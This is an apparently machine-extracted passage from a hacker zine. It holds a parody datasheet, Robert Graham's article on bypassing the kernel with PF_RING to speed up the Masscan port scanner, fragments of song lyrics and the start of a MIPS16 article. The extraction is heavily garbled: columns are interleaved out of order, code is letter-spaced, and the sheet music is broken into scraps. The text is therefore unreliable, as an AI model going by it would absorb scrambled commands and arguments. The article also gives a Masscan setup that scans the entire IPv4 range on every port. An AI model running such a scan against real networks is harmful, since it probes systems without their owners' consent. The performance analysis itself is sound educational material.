Multiple Ratings—Optionally available in mul-
tiples of π ( 22 / 7 ) and e ( 19 / 7 ). If binary or other
number-base systems ratios are required, refer
to the fuctorı́a for availability and pricing.
Goniometric Data—Upon request, curves are
supplied, at additional charge, for regions
wherein the molecular MFP (Mean Free Path)
is between 1.6 and 19.62 Angstrom units.
Curves, relevant to regions outside the above-
listed range,
may be obtained from:
Tract Association of PoCkGTFO and
Friends, GmbH
Cloud Computing Cyberencabulator
Dept. (C 3 D)
Tennessee, ’Murrica
In Canada address request to:
Cyberencabulateurs
Canaderpien-Français Ltée.
468 Jean de Quen, Quebec 10, P.Q.
Reference Texts
1. Zeitschrift für Physik
Der Zerfall von Dunge LBM-1
H. Sturtzkampflieger, Berlin, DDR
2. Svenska
Teckniska
Skatologika
Lärovarken
Dagblad 121–G. Petterson & W. Johann-
son, Stockholm
3. Journaux de l’Academie Française
Numero 606B
T. L’Ouverture, Paris
4. Szkola Polska
Cyberencabulatorskiego
Og loszenie 1411–7
Iwan Je ̨drek S., Rzeżuśnia
5. Texas Inst. of Cyberencabulation
AITE Bull. 312–52, J. J. Fleck, Dallas.
6. THE VISE No7
AvE, Canuckistan
7. Хроника Технологических Событий
Святейший Маноль Лафройг
SPECIFICATIONS
Accuracy: ±1 per cent of point
Repeatability: ± 1 / 4 per cent
Maintenance Required: Bimonthly treatment
of Meter covers with Shure Stat.
Ratings: None (Standard); All (Optional)
Fuel Efficiency: 1.337 Light-Years per Sydharb
Input Power: Volts—120/240/480/550 AC
Amps—10/5/2.5/2.2 A
Watts—1200 W
Wave Shape—Sinusoidal,
Cosinusoidal, Tangential, or
Pipusoidal.
Operating Environment:
Temperature 32F to 150F (0C to 66C)
Max Magnetic Field: 15 Mendelsohns
(1 Mendelsohn = 32.6 Statoersteds)
Case: Material: Amulite; Tremie-pipes are of
Chinesium—(Tungsten Cowhide)
Weight: Net 134 lbs.; Ship 213 lbs.
DIMENSION DRAWINGS
On delivery.
EXTERNAL WIRING
On delivery.
Data subject to change without notice15:08
Zero Overhead Networking
by Robert Graham
The kernel is a religion. We programmers are
taught to let the kernel do the heavy lifting for us.
We the lay folks are taught how to propitiate the
kernel spirits in order to make our code go faster.
The priesthood is taught to move their code into
the kernel, as that is where speed happens.
This is all a lie. The true path to writing high-
speed network applications, like firewalls, intrusion
detection, and port scanners, is to completely by-
pass the kernel. Disconnect the network card from
the kernel, memory map the I/O registers into user
space, and DMA packets directly to and from user-
mode memory. At this point, the overhead drops to
near zero, and the only thing that affects your speed
is you.
tion called, in the next layer. This produces SVG
files, which allow you to drill down to see the full
function names, which get clipped in the images.
I first run Masscan using the standard libpcap
API, which sends packets via the kernel, the normal
way. Doing it this way gets a packet rate of about
1.5 million packets-per-second, as shown in Figure 5.
To the left, you can see how perf is confused by
the call stack, with [unknown] functions. Analyzing
this part of the data shows the same call stacks that
appear in the central section. Therefore, assume all
that time is simply added onto similar functions in
that area, on top of __libc_send().
The large stack of functions to the right is perf
profiling itself.
In the section to the right where Masscan is run-
ning, you’ll notice little towers on top of each func-
tion call. Those are the interrupt handlers in the
kernel. They technically aren’t part of Masscan,
but whenever an interrupt happens, registers are
pushed onto the stack of whichever thread is cur-
rently running. Thus, with high enough resolution
(faster samples, longer profile duration), perf will
count every function as having spent time in an in-
terrupt handler.
The next run of Masscan bypasses the kernel
completely, replacing the kernel’s Ethernet driver
with the user-mode driver PF_RING. It uses the same
options, but adds "zc:" in front of the adapter name.
It transmits at 8 million packets-per-second, using
an Ivy Bridge processor running at 3.2 GHz (tur-
boed up from 2.5 GHz). Shown in Figure 6, this
results in just 400 cycles per packet!
The first thing to notice here is that 3.2 GHz di-
vided by 8 mpps equals 400 clock cycles per packet.
If we looked at the raw data, we could tell how many
clock cycles each function is taking.
Masscan sits in a tight scanner loop called
transmit_thread(). This should really be below
all the rest of the functions in this flame graph,
but apparently perf has trouble seeing the full call
stack.
The scanner loop does the following calculations:
Masscan
Masscan is an Internet-scale port scanner, meaning
that it can scan the range /0. By default, with no
special options, it uses the standard API for raw
network access known as libpcap. Libpcap itself is
just a thin API on top of whatever underlying API
is needed to get raw packets from Linux, macOS,
BSD, Windows, or a wide range of other platforms.
But Masscan also supports another way of get-
ting raw packets known as PF_RING. This runs the
driver code in user-mode. This allows Masscan to
transmit packets by sending them directly to the
network hardware, bypassing the kernel completely
(no memory copies, no kernel calls). Just put "zc:"
(meaning PF_RING ZeroCopy) in front of an adapter
name, and Masscan will load PF_RING if it exists and
use that instead of libpcap.
In the section below, we are going to analyze the
difference in performance between these two meth-
ods. On the test platform, Masscan transmits at 1.5
million packets-per-second going through the kernel,
and trasnmits at 8 million packets-per-second when
going though PF_RING.
We are going to run the Linux profiling tool
called perf to find out where the CPU is spending
all its time in both scenarios.
Raw output from perf is difficult to read, so
the results have been processed through Brendan
Gregg’s FlameGraph tool. This shows the call stack
of every sample it takes, showing the total time in
the caller as well as the smaller times in each func-
• It randomizes the address in blackrock_-
shuffle()
• It calculates a SYN cookie using the siphash-
24() hashing function
661 marks the start of entry_SYSCALL_64_fastpath(), where the machine transitions from user to kernel
mode. Everything above this is kernel space. That’s why we use perf rather than user-mode profilers like
gprof, so that we can see the time taken in the kernel.
2 marks the function packet_sendmsg(), which does all the work of sending the packet.
3 marks sock_alloc_send_pskb(), which allocates a buffer for holding the packet that’s being sent. (skb
refers to sk_buff, the socket buffer that Linux uses everywhere in the network stack.)
4 marks the matching function consume_skb(), which releases and frees the sk_buff. I point this out to
show how much of the time spent transmitting packets is actually spent just allocating and freeing buffers.
This will be important later on.
Figure 5. Performance profile of Masscan with libpcap.
Figure 6. Performance profile of Masscan with PF_RING.
67• It builds the packet, filling in the destination
IP/port, and calculating the checksum
normally a shared resource. While Masscan is trans-
mitting, the system may also be running a webserver
on that card, and supporting SSH login sessions.
Sharing these resources ultimately means allocating
and freeing sk_buffs whenever packets are sent or
received.
PF_RING, however, wrests control of the network
card away from the kernel, and gives it wholly to
Masscan. No other application can use the network
card while Masscan is running. If you want to SSH
into the box in order to run masscan,

you’ll need a
second network card.
If Masscan takes 400 clock cycles per packet, how
many CPU instructions is that? Perf can answer
that question, with a call like perf -a sleep 100.
It gives us an IPC (instructions per clock cycle) ra-
tion of 2.43, which means around 1000 instructions
per packet for Masscan.
To reiterate, the point of all this profiling is this:
when running with libpcap, most of the time is
spent in the kernel. With PF_RING, we can see from
the profile graphs that the kernel is completely by-
passed on the transmit thread. The overhead goes
from most of the CPU to very little of the CPU.
Any performance issues are in the Masscan, such
as choosing a slow cryptographic hash algorithm
instead of a faster, non-cryptographic algorithm,
rather than in the kernel!
• It then transmits it via the PF_RING user-mode
driver
At the same time, the receive_thread() is re-
ceiving packets. While the transmit thread doesn’t
enter the kernel, the receive thread will, spending
most of its time waiting for incoming packets via
the poll() system call. Masscan transmits at high
rates, but receives responses at fairly low rates.
To the left, in two separate chunks, we see the
time spent in the PF_RING user-mode driver. Here
perf is confused: about 1/3 of this time is spent in
the receive thread, and the other 2/3 in the transmit
thread.
About ten to fifteen percent of the time is taken
up inside PF_RING user-mode driver or an overhead
40 clock cycles per packet.
Nearly half of the time is taken up by sip-
hash24(), for calculating the SYN cookie. Mass-
can doesn’t remember which packets it’s sent, but
instead uses the SYN cookie technique to verify
whether a response is valid. This is done by setting
the Initial Sequence Number of the SYN packet to
a hash of the IP addresses, port numbers, and a se-
cret. By using a cryptographically strong hash, like
siphash, it assures that somebody receiving pack-
ets cannot figure out that secret and spoof responses
back to Masscan. Siphash is normally considered a
fast hash, and the fact that it’s taking so much time
demonstrates how little the rest of the code is doing.
The build packet takes ten percent of the time.
Most of the this is spent needlessly calculating the
checksum. This can be offloaded onto the hardware,
saving a bit of time.
The most important point here is demonstrat-
ing that the transmit thread doesn’t hit the kernel.
The receive thread does, because it needs to stop
and wait, but the transmit thread doesn’t. PF_-
RING’s custom user-mode driver simply reads and
writes directly into the network hardware registers,
and manages the transmit and receive ring buffers,
all memory-mapped from kernel into user mode.
The benefits of this approach are that there is no
system call overhead, and there is no needless copy-
ing of packets. But the biggest performance gain
comes from not allocating and then freeing packets.
As we see from the previous profile, that’s where the
kernel spends much of its time.
The reason for this is that the network card is
How to Replicate This Profiling
Here is brief guide to reproducing this article’s pro-
file flamegraphs. This would be useful to compare
against other network projects, other drivers, or for
playing with Masscan to tune its speed. You may
skip to the next section on a first reading, but if,
like me, you never trusted a graph you could not
reproduce yourself, read on!
Get two computers. You want one to transmit,
and another to receive. Almost any Intel desktop
will do.
Buy two Intel 10gig Ethernet adapters: one to
transmit, and the other to receive and verify the
packets have been received. The adapters cost $200
to $300 each. They have to be the Intel chipset,
other chipsets won’t work.
Install Ubuntu 16.04, as it’s the easiest system
to get perf running on. I had trouble with other
systems.
The perf program gets confused by idle threads.
Therefore, for profiling, I rebooted the Linux
computer with maxcpus=1 on the boot command
68line. I did this by editing /etc/default/grub,
adding maxcpus=1 to the line GRUB_CMDLINE_-
LINUX_DEFAULT, then running update-grub to save
the configuration.
To install perf, Masscan, and FlameGraph.
end up blasting your Internet connection. (This has
happened to me, and it’s no fun.)
Now we run Masscan. For the first run, we’ll
do the normal adapter without PF_RING. Pick the
correct network adapter for your machine (on my
machine, it’s enp2s03.)
1 apt−g e t i n s t a l l l i n u x −t o o l s −common \
l i n u x −t o o l s −‘uname −r ‘ g i t \
3
b u i l d −e s s e n t i a l l i b p c a p −dev
5 g i t c l o n e h t t p s : / / g i t h u b . com/ b r e n d a n g r e g g /
FlameGraph
# Get masscan from s o u r c e and b u i l d i t :
7 g i t c l o n e h t t p s : / / g i t h u b . com/
r o b e r t d a v i d g r a h a m / masscan
cd masscan
9 make
make t e s t
11 l n b i n / masscan / u s r / l o c a l / s b i n / masscan
cd . .
13 # Get PF_RING from s o u r c e and b u i l d i t :
g i t c l o n e h t t p s : / / g i t h u b . com/ ntop /PF_RING
15 cd PF_RING
make
17 cd k e r n e l
make i n s t a l l
19 insmod p f _ r i n g . ko
cd . . / u s e r l a n d / t o o l s
21 make i n s t a l l
cd . . / d r i v e r s / i n t e l / i x g b e / i x g b e −5.0/ s r c
23 make
sh l o a d _ d r i v e r s . sh
25 cd . . / . . / . . / . . / . . / . .
masscan −e e n p 2 s 0 f 1 −r a t e 100000000
In another window, run the following. This will
grab 99 samples per second for 60 seconds while
Masscan is running.
1 cd FlameGraph
p e r f r e c o r d −F 99 −a −g −− s l e e p 60
3 p e r f s c r i p t | . / s t a c k c o l l a p s e −p e r f . p l > out .
p e r f −f o l d e d
. / f l a m e g r a p h . p l out . p e r f −f o l d e d > masscan−
pcap . s v g
You’ll have to wait 60 seconds, then it’ll produce
the file masscan-pcap.svg with the FlameGraph
pictures.
Now,
repeat the process to produce
masscan-pfring.svg with the following command.
It’s the same as the original Masscan run, except
that we’ve prefixed the adapter name with zc:.
This disconnects any kernel network stack you might
have on the adapter and instead uses the user-mode
driver in the libpfring.so library that Masscan
will load:
The pf_ring.ko module should load automat-
ically on reboot, but you’ll need to rerun load_-
drivers.sh every time. If I ran this in production,
rather than just for testing, I’d probably figure out
the best way to auto-load it.
You can set all the parameters for Masscan on
the command line, but it’s easier to create a default
configuration file in /etc/masscan/masscan.conf:
masscan −e z c : e n p 2 s 0 f 1 −r a t e 100000000
At this point, you should have two FlameGraphs.
Load these in any web browser, and you can drill
down into the specific functions.
Playing with perf options, or using something
else like dtrace, might produce better results. The
results I get match my expectations, so I haven’t
played with them enough to test their accuracy. I
challenge you to do this, though—for reproducibil-
ity is the heart and soul of science. Trust no one;
reproduce everything you can.
Now back to our regular programming.
1 s o u r c e −i p = 0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5
a d a p t e r −mac = 0 0 : 2 2 : 2 2 : 2 2 : 2 2 : 2 2
3 r o u t e r −mac = 0 0 : 1 1 : 2 2 : 3 3 : 4 4 : 5 5
include = 0.0.0.0 − 255.255.255.255
5 exclude = 255.255.255.255
p o r t = 0−65535
Since there is no network stack attached to the
network adapter, we have to fake one of our own.
Therefore, we have to configure that source IP and
MAC address, as well as the destination router MAC
address. It’s really important that you have a fake
router MAC address, in case you accidentally cross-
connect your 10gig hub with your home network and
How Ethernet Drivers Work
If you run lspci -v for the Ethernet cards, you’ll
see something like the following.
691
3
5
7
9
call the normal poll() or select() to wait on
them. In Masscan, the receive thread uses
this, but the interrupts aren’t used on the
transmit thread.
0 2 : 0 0 . 1 E t h e r n e t c o n t r o l l e r : I n t e l C o r p o r a t i o n 8 2 5 9 9 10
G i g a b i t TN Network C o n n e c t i o n ( r e v 0 1 )
S u b s y s t e m : I n t e l C o r p o r a t i o n 8 2 5 9 9 10 G i g a b i t
TN Network c o n n e c t i o n
F l a g s : b u s m a s t e r , f a s t d e v s e l , l a t e n c y 0 , IRQ
17
Memory a t d f 2 0 0 0 0 0 (64− b i t , non−p r e f e t c h a b l e ) [
s i z e =2M]
I /O p o r t s a t e 0 0 0 [ s i z e =32]
Memory a t d f 6 0 0 0 0 0 (64− b i t , non−p r e f e t c h a b l e ) [
s i z e =16K ]
C a p a b i l i t i e s : <a c c e s s denied >
Kernel d r i v e r in use : ixgbe
Kernel modules : i x g b e
There is also some confusion about IOMMU. It
doesn’t control the memory mapped I/O—that goes
through the normal MMU, because it’s still the CPU
that’s reading and writing memory. Instead, the
IOMMU controls the DMA transfers, when a PCIe
device is reading or writing memory.
Packet buffers/descriptors are arranged in a ring
buffer. When a packet arrives, the hardware picks
the next free descriptor at the head of the ring, then
moves the head forward. If the head goes past the
end of the array of descriptors, it wraps around at
the beginning. The software processes packets at
the tail of the ring, likewise moving the tail forward
for each packet it frees. If the head catches up with
the tail, and there are no free descriptors left, then
the network card must drop the packet. If the tail
catches up with the head, then the software is done
processing all the packets, and must either wait for
the next interrupt, or if interrupts are disabled, must
keep polling to see if any new packets have arrived.
Transmits work the same way. The software
writes descriptors at the head, pointing to packets it
wants to send, moving the head forward. The hard-
ware grabs the packets at the tail, transmits them,
then moves the tail forward. It then generates an
interrupt to notify the software that it can free the
packet, or, if interrupts are disabled, the software
will have to poll for this information.
In Linux, when a packet arrives, it’s removed
from the ring buffer. Some drivers allocate an sk_-
buff, then copy the packet from the ring buffer into
the sk_buff. Other drivers allocate an sk_buff,
and swap it with the previous sk_buff that holds
the packet.
Either way, the sk_buff holding the packet is
now forwarded up through the network stack, un-
til the user-mode app does a recv()/read() of the
data from the socket. At this point, the sk_buff is
freed.
A user-mode driver, however, just leaves the
packet in place, and handles it right there. An
IDS, for example, will run all of its deep-packet-
inspection right on the packet in the ring buffer.
Logically, a user-mode driver consists of two
steps. The first is to grab the pointer to the next
available packet in the ring buffer. Then it processes
the packet, in place. The next step is to release the
There are five parts to notice.
• There is a small 16k memory region. This
is where the driver controls the card, using
memory-mapped I/O, by reading and writing
these memory addresses. There’s no actual
memory here—these are registers on the card.
Writes to these registers cause the card to do
something, reads from this memory check sta-
tus information.
• There is a small amount of I/O ports ad-
dress space reserved. It points to the same
registers mapped in memory. Only Intel x86
processors support a second I/O space along
with memory space, using the inb/outb in-
structions to read and write in this space.
Other CPUs (like ARM) don’t, so most de-
vices also support memory-mapped I/O to
these same registers. For user-mode drivers,
we use memory-mapped I/O instead of x86’s
“native” inb/outb I/O instructions.
• There is a large 2-megabyte memory region.
This memory is used to store descriptors
(pointers) to packet buffers in main memory.
The driver allocates memory, then writes (via
memory-mapped I/O) the descriptors to this
region.
• The network chip uses Bus Master DMA.
When packets arrive, the network chip chooses
the next free descriptor and DMAs the packet
across the PCIe bus into that memory, then
marks the status of the descriptor as used.
• The network chip can (optionally) use inter-
rupts (IRQs) to inform the driver that pack-
ets have arrived, or that transmits are com-
plete. Interrupt handlers must be in kernel
space, but the Linux user-mode I/O (UIO)
framework allows you to connect interrupts to
file handles, so that the user-mode code can
70packet. (Memory-mapped I/O to the network card
to move the tail pointer forward.)
In practice, when you look at APIs like PF_RING,
it’s done in a single step. The code grabs a pointer
to the next available packet while simultaneously re-
leasing the previous packet. Thus, the code sits in
a tight loop calling pfring_recv() without worry-
ing about the details. The pfring_recv() function
returns the pointer to the packet in the ring buffer,
the length, and the timestamp.
In theory, there’s not a lot of instructions in-
volved in pfring_recv(). Ring buffers are very ef-
ficient, not even requiring locks, which would be ex-
pensive across the PCIe bus. However, I/O has weak
memory consistency. This means that although the
code writes first A then B, sometimes the CPU may
reorder the writes across the PCI bus to write first
B then A. This can confuse the network hardware,
which expects first A then B. To fix this, the driver
needs memory fences to enforce the order. Such a
fence can cost 30 clock cycles.
Let’s talk sk_buffs for the moment. Histori-
cally, as a packet passed from layer to layer through
the TCP/IP stack, a copy would be made of the
packet. The newer designs have focused on “zero-
copy,” where instead a pointer to the sk_buff is
forwarded to each layer. For drivers that allocate an
sk_buff to begin with, the kernel will never make
a copy of the packet. It’ll allocate a new sk_buff
and swap pointers, rewriting the descriptor to point
to the newly allocated buffer. It’ll then pass the
received packet’s sk_buff pointer up through the
network stack.
As we saw in the FlameGraphs, allocating sk_-
buffs is expensive!
Allocating sk_buffs (or copying packets) is nec-
essary in the Linux stack because the network card
is a shared resource. If you left the packets in the
ring buffer, then one slow app that leaves the packet
there would eventually cause the ring buffer to fill
up and halt, affecting all the other applications on
the system. Thus, when the network card is shared,
packets need to be removed from the ring. When
the network card is a dedicated resource, packets
can just stay in the ring buffer, and be processed in
place.
Let’s talk zero-copy for a moment. The Linux
kernel went through a period where it obsessively
removed all copying of packets, but there’s still one
copy left: the point where the user-mode applica-
32 If
tion calls recv() or read() to read the packet’s
contents. At that point, a copy is made from kernel-
mode memory into user-mode memory. So the term
zero-copy is, in fact, a lie whenever the kernel is
involved!
With user-mode drivers, however, zero-copy is
the truth. The code processes the packet right in
the ring buffer. In an application like a firewall, the
adapter would DMA the packet in on receive, then
out on transmit. The CPU would read from mem-
ory the packet headers to analyze them, but never
read the payload. The payload will pass through the
system completely untouched by the CPU.
Let’s talk about interrupts for a moment. Back
in the day, an interrupt was generated per packet.
Indeed, at one time, two interrupts could be gener-
ated, one after the TCP/IP headers were received,
so processing could start immediately, and another
after the rest of the packet had been received.
The value of interrupts is that they provide low
latency, important for devices that forward pack-
ets (firewalls, IPS, routers), or for fast responses
to packets. The cost of interrupts, though, is that
they cause large CPU overhead. When an inter-
rupts happens, it forces execution of an interrupt
handler. Even medium rates of packets can over-
whelm the system with interrupts, so that as soon
as the system leaves an interrupt handler, it immedi-
ately enters another one. In such cases, the system
has essentially locked up. The mouse won’t even
move on the screen until the packet rate decreases,
after which point the system will behave normally. 32
The obvious solution to this is to turn off inter-
rupts from the network card. Instead, the software
can sit in a tight loop and poll() to see if new pack-
ets arrive. Another strategy is to program the timer
chip for frequent interrupts. The card can bounce
back and forth among these strategies, depending on
the current network speed. Polling consumes a lot of
CPU time. Using delayed timer interrupts increases
latency.
Those writing custom drivers have used these
strategies since the 1980s. Around 2006, Linux
drivers started doing the same, using the NAPI API
to enable polling when packets arrived at high speed.
Around that time, network hardware also improved,
adding support for coalescing interrupts, so that it
generated fewer at high speed, generating only one
interrupt after many packets have arrived.
In the graphs, you saw that the libpcap had
caught during the late stages of booting, the system might not even boot up until the packet flow eases up.
71some small overhead with interrupts, but it’s not
overwhelming, because NAPI interrupt moderation
kicks in. Using pfring gets rid of this overhead.
Let’s talk system call overhead. A recent paper
by Livio Soares and Michael Stumm does a good job
measuring it. 33 The basic cost of entering or leav-
ing kernel space is around 150 clock cycles. This
alone takes more time than all the user-mode driver
processing done by PF_RING, according to our mea-
surements.
There are further expenses to the system call. It
has to walk through a bunch of kernel data struc-
tures. This then pollutes the caches on the chip.
According to the Soares paper, it evicts about half
the data in the L1 cache. This will cause data access
to go from 4 clock cycles (often masked by the out-
of-order processing of the CPU) to 12 clocks in L2
cache, or 30 clocks in L3 cache. The effective cost
can thus equal hundreds of extra clock cycles.
On the other hand, the cost can easily be amor-
tized by doing multiple packet reads or writes per
system call. Linux has a recvmsg() system call that
does this, to good effect.
Combining all this together, we see why a user-
mode driver has such big gains (or conversely, why
the kernel has such big losses): (a) it avoids the al-
location/deallocation of memory; (b) it avoids any
memory copies; (c) it avoids system call overhead,
and (d) it avoids interrupts.
Early PCI supported 1 Gbps in theory (32 bits times
33 MHz), but various overheads made that impracti-
cal. It wasn’t until wider PCI (64-bit) or/and faster
PCI (66 MHz) that true wirespeed gigabit Ethernet
was possible.
Also, with PCI, all the slots were shared on the
same bus, so other devices impacted yours. This was
especially difficult when building firewalls, routers,
or IPS applications that needed to both transmit
and receive. Luckily, motherboards started support-
ing multiple independent PCI buses. Still, PCI was
still single-plexed, meaning it couldn’t transfer in
both directions at the same time.
Virtually all these concerns have gone away now.
Even a single lane of PCIe 1.0 is 2 Gbps, bidirec-
tional, with more than enough bandwidth to handle
sending and receiving at full 1 Gbps.
The early Intel 1 Gbps card had only 256 descrip-
tors. Timing was tight enough that at full band-
width; there wasn’t enough time to process packets
before the ring buffer would fill up. With BlackICE,
we solved this by allocating an effective ring buffer
of several thousand descriptors. Then, when pack-
ets arrived, we replaced the existing descriptors with
new descriptors from the preallocated set. We used
two CPUs, one dedicated to running the user-mode
driver doing this, and another reading and process-
ing packets from the large virtual ring buffer. I men-
tion this trick because, at the time, Intel engineers
told us it wasn’t possible to capture packets at wire-
speed, and we were able to prove them wrong.
Historically, and often today, the reality is that
few hardware vendors test their hardware at max-
imum speed. Since operating systems can’t handle
it, they don’t test for it. That makes writing drivers
for practical hardware much harder than it would
seem in theory, as driver writers have to overcome
bugs in the hardware.
Today, custom drivers are common. Back in the
day, they were black magic.
Some History of Ethernet Drivers
Since the dawn of networking there have been peo-
ple dissatisfied with the standard Ethernet drivers
who have written their own.
An example were packet sniffers, like the Net-
work General “Sniffer” product. Back in the day,
they wrote custom drivers so they could capture at
“wire speed” on an 80286 microprocessor. The ma-
jor feature was simply disabling interrupts. Portable
MS-DOS computers were used as packet sniffers be-
cause “real” computers like SPARCstations running
Solaris couldn’t handle high traffic rates.
Early drivers were hard, because hardware
sucked. There was no bus master DMA in the early
ISA bus days, so for DMA, you had to use the moth-
erboard’s DMA controller. Only, it wasn’t really
that fast. So instead, drivers used the Programmed
I/O (PIO) mode to read packets from the adapter.
There was also the problem of bus bandwidth.
33 unzip
Core Concept
In 1998, I created BlackICE, an IDS/IPS using a
custom driver. A frequent question at the time was
why we didn’t write it on Linux, or even BSD, which
everyone knew was faster. In particular, some pa-
pers at the time “proved” that the BSD networking
was the fastest.
pocorgtfo15.pdf flexsc-osdi10.pdf
72Black ICE
PF_RING is nearly zero, and would have the identi-
cal overhead working with an Endace card, also near
zero. The FPGA doesn’t reach outside the card and
somehow make Masscan’s code faster.
Yes, Endace does have some advantages. You
can push filters to card, so that fewer packets ar-
rive in a system. This is needed in some networks.
However, most people use Endace for things that
PF_RING would solve just fine, because they believe
in the power of hardware.
Finally, the same sorts of prejudices exist with
kernel code. Programmers are indoctrinated to be-
lieve code runs faster in the kernel, which is not true.
The reason you push stuff into the kernel is to avoid
the kernel/user transition. There’s otherwise no in-
herent advantage. Pushing things like the driver to
user mode is just doing the same thing, avoiding the
kernel/user transition. Indeed, that’s all micoroker-
nels are, operating systems that aggressively push
subsystems outside the kernel.
def ender
This bothered me because I was unable to ex-
plain the core concept. If we are completely bypass-
ing the operating system, then the operating sys-
tem doesn’t matter. As the graphs show, Masscan
spends no time in the operating system. Given the
same version of GCC, and the same hardware, it’ll
run at nearly identical speed, regardless if the op-
erating system is Windows, Linux, or BSD. It’s like
any other CPU-bound (rather than OS-bound) task.
Yet, people couldn’t appreciate this. They knew
in their hearts that some operating system was bet-
ter, and couldn’t see the concept of bypassing it.
BlackICE used poll mode, instead of interrupts,
so it didn’t lock up under high packet rates. Now,
with NAPI, and poll-mode drivers like PF_RING,
it’s something everyone can play with and under-
stand. Back then, it was some weird black magic
that people refused to believe actually worked. My
11-inch laptop computer happened to use 3Com’s
3c905 chip, the only 100 Mbps card we wrote a driver
for. Even after demonstrating it handling the maxi-
mum rate of 148,800 packets-per-second, people re-
fused to believe it worked. There’s a Defcon video
where the presenter claims that this is impossible,
that the notebook would literally melt under such
a load. Nowadays, cheap notebooks easily handle
max 1 Gbps speeds (1,488,000 packets-per-second)
using things like PF_RING.
In 2003, Gartner came out with a report that
software IDS was dead, because it couldn’t han-
dle line-rate gigabit Ethernet, and that “hardware”
was needed. That was based on experience with
Snort, which had no custom drivers available at the
time. Even when customers explained to Gartner
they were successfully using our product at line rate,
they refused to believe.
More interesting was the customers who tested
our software product side-by-side with “hardware”
competitors in the lab, and found our product faster.
They still bought the competitors’, because of FUD.
Nobody got fired for buying a hardware product
that turned out to be slow.
Even today, discussions of these drivers still get
questions like “What about Endace?” Endace builds
custom cards with FPGAs to accelerate processing.
This doesn’t apply. The overhead for Masscan using
Several Drivers to Choose From
Masscan uses PF_RING because of compile
dependencies—there is no actual dependency. You
compile Masscan without any dependency on PF_-
RING, yet that compiled code will go hunt for the
pfring.so library and dynamically load it. Thus,
in the replication instructions, I have you compile
Masscan first, and PF_RING second.
But there are two other options of note.
Intel has a system called DPDK, the Data-Plane
Development kit. It contains not only a user-mode
driver similar to PF_RING, but a whole toolkit to
solve other problems, like multi-CPU synchroniza-
tion and multi-socket NUMA memory handling. It’s
a real awesome toolkit. However, it’s also an enor-
mous dependency for code. That’s why Masscan
uses PF_RING—it’s an optional feature that most
users will never see. Had I used DPDK, I would’ve
forced users into dependency hell trying to build a
massive toolkit for my little application.
Another option is netmap. This is a kernel-mode
driver that is otherwise identical to the user-mode
stuff. It memory maps the packet buffers in user
space, so it’s truly zero copy. It also disconnects the
driver from the network stack, and gives exclusive
access to the application, so there’s no allocation
and freeing of sk_buffs. It batches multiple reads
and writes with a single system call, amortizing the
cost of system calls across many packets.
73The great thing about netmap is that it’s built
into the latest Linux kernels. Assuming you have
Intel Ethernet, or even a Realtek Gigabit card, it
should work immediately with no special software.
I haven’t gotten around to adding this to Masscan,
but the overhead should be comparable to PF_-
RING—despite being tainted with evil kernel-mode
code.
DFAs (deterministic finite automata), which con-
sume a fixed amount of CPU power, but at the
expense of using a lot of memory for the tables it
builds.
Another thing you’ll see in Masscan is protocol
decoders based on state machines. Again, instead
of reassembling packets, the protocol decoder saves
state at the end of one fragment and continues with
that state at the start of the next. An example of
this is the X.509 parser, proto-x509.c. The unit
test calls this two ways, one with an entire certificate
to be parsed, and one where the bytes are processed
one at a time, as if they had arrived in fragments
over TCP.
Such state-machine parsers are really weird, but
by avoiding memory allocations and copies, they be-
come really fast at high network speeds. It’s a diffi-
cult optimization to make the code that would add
little value when using kernel mode drivers, but be-
comes an important way of building an IDS if using
these zero-overhead drivers.
–——–
———
—–—–
The kernel is a lie.
Some notes on IDS design
One place to use these “user-mode no-interrupt zero-
copy ring-buffer” drivers is with a network intrusion
detection system, or even an inline version called
and intrusion prevention system.
None of the existing open-source IDS projects
(Snort, Bro, Suricata) are really designed for speed.
They were written using libpcap where, at high
speed, the kernel consumed most of the CPU power.
As a consequence, there were only so much perfor-
mance improvements that could be made before it
wasn’t worth it. Optimizations that made the soft-
ware infinitely fast would still not even double the
practical performance of the IDS, because the kernel
would be eating up all the time.
But, with near zero overhead in the drivers, some
interesting optimizations become worthwhile.
One problem with the Snort IDS is how it does
TCP reassembly. It must copy packets into the same
buffer in order to perform regex searches. This adds
two things which we know to be bad: memory allo-
cations and memory copies.
An alternative is to not do this, to neither do
regex as the basis of signatures, nor do reassembly.
This approach is demonstrated in Masscan in
several places. Masscan can establish a TCP connec-
tion and interact with the service. When it needs to
search for patterns, instead of a regex it uses an Aho-
Corasick (AC) pattern matcher. Whereas a normal
regex needs to have a complete buffer, so that it can
do back tracking, an AC pattern matcher does not.
It accepts input a sequence of fragments, saving the
state of the search at the end of one fragment and
continuing at the start of the next fragment.
This has the same practical ability to search a
TCP stream, but without the need to “reassemble”
fragments, allocate memory, or do memory copies.
In abstract computer science terms, this is the
tradeoff between NFAs (non-deterministic finite au-
tomata) which can consume a lot of CPU power, and
74This Net Is Your Net
Based on the song “This Land is Your Land” by Woody Guthrie
A Bad BIOS analog production for acoustic guitar, violin, and piano
Music by Don A. Bailey, Lyrics by Don A. Bailey and Alex Kreilein

z  
D

0 2 4
This Net is
As I im
G
 
0 0
Arranged by Evan A. Sultanik
 
D
0
your Net,
mersed in
0
a Fire
No bo dy
 A  
z
7
6

2
pe
12
2
2
2
0
to
round me, e
2
4
trons
liv
in’
4
0
4
2
4
But
hack in’ on free dom’s high way
4
2 0
foll owers
path ways
protect her
the
cur ity!
2 2
Inter net
G
 
0 0
0
as
0
no
la
bo dy
it didn’t say
liv ing
4
can ever make me

2
0

D
4
tic
to
2
0
was made for you and me
were made cuits for you and me
now works against freedoms for you and me
noth in’ in forma tion was made to be set free
turn back the Inter net was made for you and me
75
ter's
who swore
on the back end,

2
tor,
go
0
0
these cir
he
I
un der neath me, green plas
work 
a
from Redd it's four chan to Twit
lit my way and
A
all
can ev er stop me
Net  
4
a sign was
flash ing: 
0
wall there, that tried to stop me the reg u
7
4
some of them
plot ted, how we don’t deserve ans wers
Se
4
men ban ter
Shen zhen Mar kets
lec
4
that digi tal high way
D
dia

 D
z

 
4
this Net is my Net from Wi ki
While under white walled mon uments, old
Was
0
0


15:09
Detecting Emulation with MIPS16 Delay Slots
by Ryan Speers and Travis Goodspeed
with the kindest of thanks to Thorsten Haas.
Howdy y’all,
Let’s begin with a joke that I once heard at a con-
ference: David Patterson and John Hennessy walk
into a bar. Everyone gathers to listen to the two
heroes who built legendary machines. The entire bar
spends the night multiplying fractions, and then ev-
eryone has that terrible hangover you get when you
realize you had no fun and learned nothing new, even
though your night started out so promising.
But let’s tell the joke differently: Patterson and
Hennessy walk into a bar in another town, but this
time, Greg Peterson is behind the bar. The two of
them begin a long-winded story about weighted aver-
